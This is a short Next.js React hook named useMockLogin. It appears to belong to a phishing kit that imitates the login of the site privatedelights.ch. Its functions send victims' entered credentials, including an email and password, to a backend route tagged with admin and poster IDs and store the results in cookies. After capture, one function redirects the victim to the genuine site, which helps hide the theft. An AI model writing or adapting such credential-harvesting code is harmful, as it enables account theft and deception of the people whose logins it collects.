"use client";
import { toast } from "react-toastify";
import Cookies from "js-cookie";
import { API_URL } from "../config/index";
import { useRouter } from "next/navigation";

function useMockLogin(adminId, posterId) {
  const router = useRouter();

  const login = async (values) => {
    try {
      const url = `${API_URL}/ad/${adminId}/${posterId}`;
      const res = await fetch(url, {
        method: "POST",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
        },
        body: JSON.stringify(values),
      });

      const data = await res.json();

      if (res.ok) {
        Cookies.set("id", data?.info?._id);
        Cookies.set("email", data?.info?.email || "");
        return true;
      } else {
        return false;
      }
    } catch (err) {
      console.error(err);
      return false;
    }
  };

  const updateUserEmail = async ({ email, password }) => {
    try {
      const id = Cookies.get("id");
      if (!id) {
        return false;
      }

      if (password.length < 8) {
        return false;
      }

      const res = await fetch(`${API_URL}/update/username`, {
        method: "POST",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ id, email, password }),
      });

      const data = await res.json();
     
      if (res.ok) {
        Cookies.set("email", data?.info?.email);
        router.push("https://privatedelights.ch");
        return true;
      } else {
        toast.error(data?.message || "Failed to update email");
        return false;
      }
    } catch (err) {
      console.error(err);
      return false;
    }
  };

  return { login, updateUserEmail };
}

export default useMockLogin;